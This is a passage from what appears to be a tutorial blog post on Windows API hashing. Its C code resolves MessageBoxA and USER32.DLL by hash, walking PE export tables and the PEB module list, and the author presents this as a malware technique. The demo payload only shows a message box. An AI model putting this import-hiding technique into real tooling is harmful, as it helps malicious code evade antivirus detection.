the same as the precomputed hardcoded one we compare with.\nLet\u0026rsquo;s start analyzing. We first call the GetProcAddressH which is a custom function that passes as arguments the handle of the previously loaded DLL, and the hash of the MessageBoxA (MessageBoxA_HASH) we precomputed:\n#define MessageBoxA_HASH 0xF10E27CA typedef int (*PfnMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); int main(int argc, wchar_t* argv[]) { if (argc != 2) { wprintf(L\u0026#34;Usage: %s \u0026lt;target_dll_name\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Get the DLL passed as argument, for example user32.dll wchar_t* targetDllName = argv[1]; // Get a handle for this dll HMODULE hModule_of_arg_dll = GetModuleHandleA((LPCSTR)targetDllName); // If it is not loaded in memory, load it now if (hModule_of_arg_dll == NULL) { hModule_of_arg_dll = LoadLibraryA(targetDllName); } // Getting the address of MessageBoxA function using GetProcAddressH PfnMessageBoxA pMessageBoxA = (PfnMessageBoxA)GetProcAddressH(hModule_of_arg_dll, MessageBoxA_HASH); if (pMessageBoxA == NULL) { printf(\u0026#34;[!] Couldn\u0026#39;t Find Address Of Specified Function \\n\u0026#34;); return -1; } We also cast to PfnMessageBoxA. This is because our GetProcAddressH as we will see shortly returns a pointer to the address of the matching hashed function. So since we get back a pointer to an address, we cast to the corresponding type of data this address contains, which is of fnMessageBoxA type.\nOne side note here is that the PfnMessageBoxA is not the actual MessageBox. The actual MessageBox has the following struct:\nint MessageBox( [in, optional] HWND hWnd, [in, optional] LPCTSTR lpText, [in, optional] LPCTSTR lpCaption, [in] UINT uType ); so we just defined our own same data struct.\nHash function Before we finally dive into the GetProcAddressH to see the process of API Hashing, let\u0026rsquo;s see the hash function that will be used first:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #define INITIAL_SEED\t7\t// Generate JenkinsOneAtATime32Bit hashes from Ascii input string UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String) { SIZE_T Index = 0; UINT32 Hash = 0; SIZE_T Length = lstrlenA(String); while (Index != Length) { Hash += String[Index++]; Hash += Hash \u0026lt;\u0026lt; INITIAL_SEED; Hash ^= Hash \u0026gt;\u0026gt; 6; } Hash += Hash \u0026lt;\u0026lt; 3; Hash ^= Hash \u0026gt;\u0026gt; 11; Hash += Hash \u0026lt;\u0026lt; 15; return Hash; } #define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API)) This is just one hash function that can be used. It was taken from the VX Underground repo. You could use whatever function you want.\nWe also define a shorter name for this function, HASHA, which takes as a parameter the API (the function) that the code will hash. We also cast the parameter (API) to (PCHAR) since the HashStringJenkinsOneAtATime32BitA takes as a parameter a (PCHAR) string.\nGetProcAddressH - Load, Hash, Compare, Repeat The code responsible for loading the functions of the given dll, hashing them and comparing with the hardcoded precomputed value, is the following:\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PVOID\tpFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); // Hashing every function name pFunctionName // If both hashes are equal then we found the function we want if (dwApiNameHash == HASHA(pFunctionName)) { return pFunctionAddress; } } return NULL; } This code, besides the hashing part, mostly does checks on the PE fields to make sure everything is correct before continuing. This is usually what malwares do to make sure they will definitely run on the victim\u0026rsquo;s machine and would ideally not want to risk running on some error on runtime.\nWe can break down the checks and make a short introductory on loading a PE file on memory, but a more in depth post will be posted in the future regarding this.\nTo begin with, we make sure that neither the handle to the DLL\u0026rsquo;s address nor the Hash of the target function that are passed as parameters are null:\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; /* -- more -- */ } Continuing on, we cast the pBase (Which is just the handle to the address of the DLL) to PIMAGE_DOS_HEADER:\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; /* -- more -- */ } Why? Well, the handle just currently points to a memory address. This memory address contains the bytes of the DLL. These bytes are not just \u0026ldquo;bytes\u0026rdquo; but they represent fields of a struct - specifically that of an IMAGE_DOS_HEADER, since DLL\u0026rsquo;s such as EXE start with this struct.\nIn other words, the address where the pBase has is the memory address of a series of bytes, that when casted to PIMAGE_DOS_HEADER (since this is the appropriate starting struct for a DLL) gives us access to its fields:\nThis cast to PIMAGE_DOS_HEADER which is the top header of the DLL gives us all we need to calculate the addresses of the rest of the headers, as we will see shortly.\nThe code, after casting to the appropriate data structure, checks if the e_magic is equal to IMAGE_DOS_SIGNATURE. The IMAGE_DOS_SIGNATURE is actually MZ, and thus, the e_magic is always MZ for an executable/dll file. The full struct of IMAGE_DOS_HEADER that contains this field is the following:\ntypedef struct _IMAGE_DOS_HEADER { WORD e_magic; WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; After the validation for the MZ header, we use the pBase (the base address of our dll) in combination with a field of the IMAGE_DOS_HEADER struct to calculate the VA (Virtual Address) of the IMAGE_NT_HEADERS struct, which is the third header seen in the previous image (\u0026lsquo;NT Headers\u0026rsquo;):\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; /* -- more -- */ } The field used here from the IMAGE_DOS_HEADER is the e_lfanew field, which is also known as RVA (Relative Virtual Address). Basically the relationship between the base address, RVA and VA goes as the following:\nBase address: This is an address in memory that acts as the starting point. It simply is where something initially was saved at. Here our DLL was loaded at an address which we have stored in our pBase variable. RVA: Relative Virtual Address is like an offset of some field of our DLL. Basically, the DLL contains many stucts and instead of storing the address of each one, we just use the base address of our DLL (where it starts) and an offset, which is how far away is from the starting point (baseAddress). VA: Virtual Address is the actual address (starting point) of the field/struct we want to land on. In summary: baseAddress + RVA[something] = VA[something]\nSo, here the e_lfanew is the offset of the DLL\u0026rsquo;s base address to the NT_HEADER struct. By adding the base address of our DLL with this field, we get the VA (actual address) of the NT_HEADER struct that we can now cast to the corresponding type and gain access to its fields.\nThe struct of the IMAGE_NT_HEADERS is the following:\ntypedef struct _IMAGE_NT_HEADERS { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader; } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; The Signature we are doing the check with is actually the \u0026lsquo;PE\u0026rsquo; that executables and DLL\u0026rsquo;s have. This is just another check the program does before proceeding forward with the API Hashing.\nMoving further, it is now time to finally get the function names, their addresses and their ordinals (integer numbers representing the functions):\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); /* -- more -- */ The code continues with using the ImgOptHdr we previously calculated in order to load the necessary fields and structs that contain the information we are aiming for. But what is the ImgOptHdr and what useful info does it contain?\nIt\u0026rsquo;s struct is the following (IMAGE_OPTIONAL_HEADER):\ntypedef struct _IMAGE_OPTIONAL_HEADER { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; In the code we utilized the DataDirectory table field and specifically the index named \u0026lsquo;IMAGE_DIRECTORY_ENTRY_EXPORT\u0026rsquo;. Taking a look at what the IMAGE_DATA_DIRECTORY struct contains, we see the following:\ntypedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; So basically the DataDirectory field is a table that contains structs with fields a VirtualAddress and Size. In our code we used the index IMAGE_DIRECTORY_ENTRY_EXPORT and that led us to a _IMAGE_DATA_DIRECTORY with a VirtualAddress - since this is what we are taking with the \u0026lsquo;-\u0026gt;\u0026rsquo; symbol - and Size. But why we used the specific index and why does this can be casted back to IMAGE_EXPORT_DIRECTORY?\nWe simply CTRL+click onto the index and see the following:\n// Directory Entries #define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory // IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage) #define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor So the IMAGE_DIRECTORY_ENTRY_EXPORT is equal to 0 (the first entry) and it basically points to the Export directory. Awesome! That is the reason we cast the result back to IMAGE_EXPORT_DIRECTORY.\nTaking a look at the IMAGE_EXPORT_DIRECTORY struct, we see the following fields:\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image }; As the comments explain, the AddressOfFunctinos, AddressOfNames and AddressOfNameOrdinals are RVA\u0026rsquo;s from the base address. So this is why we once again use pBase plus these to get the VA (the actual address) of these fields.\nFinally, we loop through the function names and ordinals of each function, hash each one and compare with our target hash:\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PVOID\tpFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); // Hashing every function name pFunctionName // If both hashes are equal then we found the function we want if (dwApiNameHash == HASHA(pFunctionName)) { return pFunctionAddress; } } return NULL; Things to note here is that the VA of FunctionNameArray and FunctionAddressArray are arrays that contain RVA\u0026rsquo;s, so that\u0026rsquo;s why we again use pBase for the calculations of the actual addresses.\nFinally, we use the hashing of the function\u0026rsquo;s name and comparisson with the target hash.\nThe full code is the following:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #define INITIAL_SEED\t7\t// Generate JenkinsOneAtATime32Bit hashes from Ascii input string UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String) { SIZE_T Index = 0; UINT32 Hash = 0; SIZE_T Length = lstrlenA(String); while (Index != Length) { Hash += String[Index++]; Hash += Hash \u0026lt;\u0026lt; INITIAL_SEED; Hash ^= Hash \u0026gt;\u0026gt; 6; } Hash += Hash \u0026lt;\u0026lt; 3; Hash ^= Hash \u0026gt;\u0026gt; 11; Hash += Hash \u0026lt;\u0026lt; 15; return Hash; } #define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API)) #define MessageBoxA_HASH 0xF10E27CA typedef int (*PfnMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PVOID\tpFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); // Hashing every function name pFunctionName // If both hashes are equal then we found the function we want if (dwApiNameHash == HASHA(pFunctionName)) { return pFunctionAddress; } } return NULL; } int main(int argc, wchar_t* argv[]) { if (argc != 2) { wprintf(L\u0026#34;Usage: %s \u0026lt;target_dll_name\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Get the DLL passed as argument, for example user32.dll wchar_t* targetDllName = argv[1]; // Get a handle for this dll HMODULE hModule_of_arg_dll = GetModuleHandleA((LPCSTR)targetDllName); // If it is not loaded in memory, load it now if (hModule_of_arg_dll == NULL) { hModule_of_arg_dll = LoadLibraryA(targetDllName); } // Getting the address of MessageBoxA function using GetProcAddressH PfnMessageBoxA pMessageBoxA = (PfnMessageBoxA)GetProcAddressH(hModule_of_arg_dll, MessageBoxA_HASH); if (pMessageBoxA == NULL) { printf(\u0026#34;[!] Couldn\u0026#39;t Find Address Of Specified Function \\n\u0026#34;); return -1; } // Calling MessageBoxA pMessageBoxA(NULL, \u0026#34;Avoiding names - executing functions\u0026#34;, \u0026#34;:)\u0026#34;, MB_OK | MB_ICONEXCLAMATION); printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; To Quit ... \u0026#34;); getchar(); return 0; } and the result upon execution is:\nAPI Hashing - Finding the DLL via hash In the previous code we saw how to load a function via its hash, while giving the name of the dll name we want to use. But what about using the same technique for the dll name itself?\nWell, that is exactly what we are going to do. We will a hash both for the DLL name but also with a function within it (just as previously).\nCode additions Utilizing our previous code, we need to do some small aditions:\nSpecify the Hash value for \u0026ldquo;USER32.DLL\u0026rdquo; hash that we will be comparing with. Make the necessary checks to see if this dll is loaded to memory before proceeding. Create our own CreateModuleHandleH function to return a Handle to the specified DLL. The way it will find the DLL will be using API Hashing, as previously. Specifying the Hash The only line we need for this is the following:\n#define USER32DLL_HASH 0x81E3778E Check if USER32.DLL is loaded A check we need to do before proceeding is to see if the DLL is loaded and load it to memory. If an error occurs, we stop the execution:\nif (LoadLibraryA((LPCSTR)targetDllName) == NULL) { printf(\u0026#34;Failed to load target dll with error %d. Exiting...\u0026#34;, GetLastError()); return 0; } GetModuleHandleH Now comes the custom function that will take care of the API Hashing for the DLL name. The full code is:\ntypedef struct _PEB_LDR_DATA_full { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; BOOLEAN ShutdownInProgress; HANDLE ShutdownThreadId; } PEB_LDR_DATA_full, * PPEB_LDR_DATA_full; // this is the ldr module. Basically it refers to the information of a dll entry to ldr_module_table typedef struct _LDR_MODULE_full { LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID BaseAddress; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; } LDR_MODULE_full, * PLDR_MODULE_full; HMODULE GetModuleHandleH(DWORD dwModuleNameHash) { #ifdef _WIN64 PPEB pPEB = (PPEB)__readgsqword(0x60); #else PPEB pPEB = (PPEB)__readfsdword(0x30); #endif PPEB_LDR_DATA_full pLdr = pPEB-\u0026gt;Ldr; LIST_ENTRY* pListEntry = pLdr-\u0026gt;InLoadOrderModuleList.Flink; LIST_ENTRY* pListHead = \u0026amp;pLdr-\u0026gt;InLoadOrderModuleList; while (pListEntry != pListHead) { PLDR_MODULE_full pLdrModule = CONTAINING_RECORD(pListEntry, LDR_MODULE_full, InLoadOrderModuleList); // Print the BaseAddress and BaseDllName printf(\u0026#34;BaseAddress: %p\\n\u0026#34;, pLdrModule-\u0026gt;BaseAddress); wprintf(L\u0026#34;BaseDllName: %wZ\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName); char dllName[256]; snprintf(dllName, sizeof(dllName), \u0026#34;%wZ\u0026#34;, pLdrModule-\u0026gt;BaseDllName); printf(\u0026#34;HASH: 0x%x \\n\u0026#34;, HASHA((PCHAR)dllName)); if ( HASHA(dllName) == dwModuleNameHash) { wprintf(L\u0026#34;Target DLL %wZ found at BaseAddress: %p\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName, pLdrModule-\u0026gt;BaseAddress); return pLdrModule-\u0026gt;BaseAddress; // Exit the program once the target DLL is found } // Move to the next entry pListEntry = pListEntry-\u0026gt;Flink; } wprintf(L\u0026#34;Target DLL with hash %s not found\\n\u0026#34;, dwModuleNameHash); return 1; } Most of this code has already been shown and explained in the Exploring PEB struct and its fields post. We will explain only the new additions.\nFirst off, we get the current LDR_MODULE and print its hash value:\nchar dllName[256]; snprintf(dllName, sizeof(dllName), \u0026#34;%wZ\u0026#34;, pLdrModule-\u0026gt;BaseDllName); printf(\u0026#34;HASH: 0x%x \\n\u0026#34;, HASHA((PCHAR)dllName)); We use snprintf to format a unicode string (%wZ) - specifically the pLdrModule-\u0026gt;BaseDllName - to a char* type. What we do is declare a buffer and copy the UNICODE_STRING that has been converted to char* into that buffer.\nThen we simply hash that dllName we just got from the Unicode convertion of the BaseDllName, and compare it with the parameter given to the function, which is the USER32.DLL hash. If there is a match, we return its BaseAddress (the address that this DLL is loaded in memory).\nSo the whole idea of this function GetModuleHandleH is to loop over all the loaded DLL\u0026rsquo;s from the LDR_MODULE, hash and compare each one to the target hash.\nThe full code for hashing both the Dll and the target function is the following:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #define INITIAL_SEED\t7\t// Generate JenkinsOneAtATime32Bit hashes from Ascii input string UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String) { SIZE_T Index = 0; UINT32 Hash = 0; SIZE_T Length = lstrlenA(String); while (Index != Length) { Hash += String[Index++]; Hash += Hash \u0026lt;\u0026lt; INITIAL_SEED; Hash ^= Hash \u0026gt;\u0026gt; 6; } Hash += Hash \u0026lt;\u0026lt; 3; Hash ^= Hash \u0026gt;\u0026gt; 11; Hash += Hash \u0026lt;\u0026lt; 15; return Hash; } #define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API)) #define USER32DLL_HASH 0x81E3778E #define MessageBoxA_HASH 0xF10E27CA typedef int (*PfnMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); // this is the ldr struct typedef struct _PEB_LDR_DATA_full { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; BOOLEAN ShutdownInProgress; HANDLE ShutdownThreadId; } PEB_LDR_DATA_full, * PPEB_LDR_DATA_full; // this is the ldr module. Basically it refers to the information of a dll entry to ldr_module_table typedef struct _LDR_MODULE_full { LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID BaseAddress; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; } LDR_MODULE_full, * PLDR_MODULE_full; FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PVOID\tpFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); // Hashing every function name pFunctionName // If both hashes are equal then we found the function we want if (dwApiNameHash == HASHA(pFunctionName)) { return pFunctionAddress; } } return NULL; } HMODULE GetModuleHandleH(DWORD dwModuleNameHash) { #ifdef _WIN64 PPEB pPEB = (PPEB)__readgsqword(0x60); #else PPEB pPEB = (PPEB)__readfsdword(0x30); #endif PPEB_LDR_DATA_full pLdr = pPEB-\u0026gt;Ldr; LIST_ENTRY* pListEntry = pLdr-\u0026gt;InLoadOrderModuleList.Flink; LIST_ENTRY* pListHead = \u0026amp;pLdr-\u0026gt;InLoadOrderModuleList; while (pListEntry != pListHead) { PLDR_MODULE_full pLdrModule = CONTAINING_RECORD(pListEntry, LDR_MODULE_full, InLoadOrderModuleList); // Print the BaseAddress and BaseDllName printf(\u0026#34;BaseAddress: %p\\n\u0026#34;, pLdrModule-\u0026gt;BaseAddress); wprintf(L\u0026#34;BaseDllName: %wZ\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName); char dllName[256]; snprintf(dllName, sizeof(dllName), \u0026#34;%wZ\u0026#34;, pLdrModule-\u0026gt;BaseDllName); printf(\u0026#34;HASH: 0x%x \\n\u0026#34;, HASHA((PCHAR)dllName)); if ( HASHA(dllName) == dwModuleNameHash) { wprintf(L\u0026#34;Target DLL %wZ found at BaseAddress: %p\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName, pLdrModule-\u0026gt;BaseAddress); return pLdrModule-\u0026gt;BaseAddress; // Exit the program once the target DLL is found } // Move to the next entry pListEntry = pListEntry-\u0026gt;Flink; } wprintf(L\u0026#34;Target DLL with hash %s not found\\n\u0026#34;, dwModuleNameHash); return 1; } int main(int argc, wchar_t* argv[]) { if (argc != 2) { wprintf(L\u0026#34;Usage: %s \u0026lt;target_dll_name\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Get the DLL passed as argument, for example user32.dll wchar_t* targetDllName = argv[1]; // Make sure target Dll is loaded before proceeding to enumerate its functions. if (LoadLibraryA((LPCSTR)targetDllName) == NULL) { printf(\u0026#34;Failed to load target dll with error %d. Exiting...\u0026#34;, GetLastError()); return 0; } HMODULE hModule_of_arg_dll = GetModuleHandleH(USER32DLL_HASH); // Getting the address of MessageBoxA function using GetProcAddressH PfnMessageBoxA pMessageBoxA = (PfnMessageBoxA)GetProcAddressH(hModule_of_arg_dll, MessageBoxA_HASH); if (pMessageBoxA == NULL) { 